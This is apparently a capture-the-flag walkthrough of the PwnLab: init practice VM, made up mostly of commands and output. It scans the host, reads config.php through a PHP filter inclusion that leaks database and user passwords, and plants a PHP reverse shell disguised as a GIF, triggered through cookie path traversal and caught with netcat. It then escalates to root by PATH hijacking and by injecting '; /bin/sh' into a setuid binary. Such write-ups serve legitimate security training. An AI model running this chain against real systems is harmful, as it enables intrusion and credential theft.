Wellcome to "PwnLab: init", my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.

```bash

└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.44
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 14:58 CEST
Nmap scan report for 192.168.110.44
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41476/udp   status
|   100024  1          47935/tcp   status
|   100024  1          54492/tcp6  status
|_  100024  1          54833/udp6  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, FoundRows, ODBCClient, LongPassword, Speaks41ProtocolOld, ConnectWithDatabase, InteractiveClient, SupportsLoadDataLocal, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsTransactions, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: %TV3:j)*8xuewG<7?tOj
|_  Auth Plugin Name: mysql_native_password
47935/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:A8:F3:9B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms 192.168.110.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds

```


└─$ nikto --url 192.168.110.44
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.44
+ Target Hostname:    192.168.110.44
+ Target Port:        80
+ Start Time:         2021-09-11 15:02:26 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2021-09-11 15:03:20 (GMT2) (54 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



curl http://192.168.110.44/?page=php://filter/convert.base64-encode/resource=config

```bash
└─$ echo "PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==" | base64 -d
```


```php

<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
        $luser = $_POST['user'];
        $lpass = base64_encode($_POST['pass']);

        $stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
        $stmt->bind_param('ss', $luser, $lpass);

        $stmt->execute();
        $stmt->store_Result();

        if ($stmt->num_rows == 1)
        {
                $_SESSION['user'] = $luser;
                header('Location: ?page=upload');
        }
        else
        {
                echo "Login failed.";
        }
}
else
{
        ?>
        <form action="" method="POST">
        <label>Username: </label><input id="user" type="test" name="user"><br />
        <label>Password: </label><input id="pass" type="password" name="pass"><br />
        <input type="submit" name="submit" value="Login">
        </form>
        <?php
}

```


```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
        if (isset($_GET['page']))
        {
                include($_GET['page'].".php");
        }
        else
        {
                echo "Use this server to upload and share image files inside the intranet";
        }
?>
</center>
</body>
</html> 

```

```php
//config.php

<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?> 

```

+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |  JWzXuBJJNy
| mike | U0lmZHNURW42SQ== |  SIfdsTEn6I
| kane | aVN2NVltMkdSbw== |  iSv5Ym2GRo


```bash

$ head php-reverse-shell.gif 
GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP

```


Login with username: kent and password JWzXuBJJNy.
Upload file php-reverse-shell.gif 
Return to the page index
Set a cookie with 
name = lang 
value = ../upload/3208fd203ca8fdfa13bc98a4832c1396.gif


```bash

$ nc -lp 1234 
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 11:45:09 up 14 min,  0 users,  load average: 0.00, 0.01, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su kane
su kane
Password: iSv5Ym2GRo


```
``` bash

kane@pwnlab:~$ cat cat 
cat cat
cp /bin/sh /tmp/sh
chmod 4755 /tmp/sh

```


```bash
kane@pwnlab:~$ strings msgmike

```

```bash

kane@pwnlab:~$ cat cat 
cat cat
cp /bin/sh /tmp/sh
chmod 4755 /tmp/sh
kane@pwnlab:~$ export PATH=/home/kane:$PATH
export PATH=/home/kane:$PATH
kane@pwnlab:~$ echo $PATH
echo $PATH
/home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
kane@pwnlab:~$ chmod +x cat
chmod +x cat


```

```bash

kane@pwnlab:~$ ./msgmike
./msgmike
kane@pwnlab:~$ ls -al /tmp/sh
ls -al /tmp/sh
-rwsr-xr-x 1 mike mike 124492 Sep 14 11:50 /tmp/sh
kane@pwnlab:~$ /tmp/sh
/tmp/sh
$ id
uid=1003(kane) gid=1003(kane) euid=1002(mike) groups=1003(kane)
$ whoami
mike

```
```bash
$ strings msg2root

Message for root: 
/bin/echo %s >> /root/messages.txt


```

```bash
./msg2root
Message for root: test | id
test | id
uid=1003(kane) gid=1003(kane) euid=0(root) egid=0(root) groups=0(root),1003(kane)


```

```bash

./msg2root
Message for root: test ; /bin/sh
test ; /bin/sh
test
# id
id
uid=1003(kane) gid=1003(kane) euid=0(root) egid=0(root) groups=0(root),1003(kane)
# whoami
whoami
root

```


